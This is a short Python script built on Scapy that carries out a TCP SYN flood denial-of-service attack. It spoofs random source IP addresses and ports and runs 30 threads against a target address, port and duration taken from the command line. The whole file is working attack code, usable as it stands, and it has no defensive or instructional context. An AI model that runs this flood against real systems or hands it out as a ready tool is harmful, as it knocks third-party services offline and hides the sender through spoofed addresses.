from scapy.all import send
from scapy.layers.inet import IP, TCP
import random
import time
import threading
import sys

# Function to send SYN packets
def send_syn(target_ip, target_port, stop_event):
    while not stop_event.is_set():
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        send(ip_layer / tcp_layer, verbose=0)

# Main function to start the SYN flood attack
def syn_flood(target_ip, target_port, duration, num_threads=10):
    stop_event = threading.Event()  # Event to stop threads
    threads = []

    # Create and start threads
    for _ in range(num_threads):
        thread = threading.Thread(target=send_syn, args=(target_ip, target_port, stop_event))
        thread.start()
        threads.append(thread)

    # Let the attack run for the specified duration
    print(f"SYN flood attack running for {duration} seconds...")
    time.sleep(duration)

    # Stop all threads
    print("Stopping SYN flood attack...")
    stop_event.set()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("SYN flood attack completed.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 syn_flood.py <target_ip> <target_port> <duration>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    # Number of threads (can be adjusted based on system resources)
    num_threads = 30

    # Start the SYN flood attack
    syn_flood(target_ip, target_port, duration, num_threads)
